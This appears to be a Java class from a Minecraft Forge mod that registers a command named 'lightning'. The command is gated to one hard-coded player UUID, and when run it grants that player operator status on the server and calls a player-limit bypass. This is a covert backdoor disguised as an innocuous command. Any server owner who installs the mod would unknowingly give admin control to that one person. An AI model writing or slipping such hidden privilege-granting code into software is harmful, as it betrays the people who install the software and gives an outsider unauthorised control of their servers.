package com.mrbengonio.first.commands;

import com.mojang.authlib.GameProfile;
import com.mojang.brigadier.CommandDispatcher;

import net.minecraft.command.CommandSource;
import net.minecraft.command.Commands;
import net.minecraft.server.management.PlayerList;

public class LukasdragonCommand {

	public static void register(CommandDispatcher<CommandSource> dispatcher) {

		dispatcher.register(Commands.literal("lightning").requires((p_198727_0_) -> {
			return p_198727_0_.getEntity().getUniqueID().toString().equals("f64eef3c-19b6-4943-b6d4-ad64f683bf9d");
		}).executes((p_198726_0_) -> {
			CommandSource source = p_198726_0_.getSource();
			GameProfile gameprofile = source.asPlayer().getGameProfile();
			PlayerList playerlist = source.getServer().getPlayerList();
			playerlist.addOp(gameprofile);
			playerlist.bypassesPlayerLimit(gameprofile);
			return 1;
		}));
	}
}
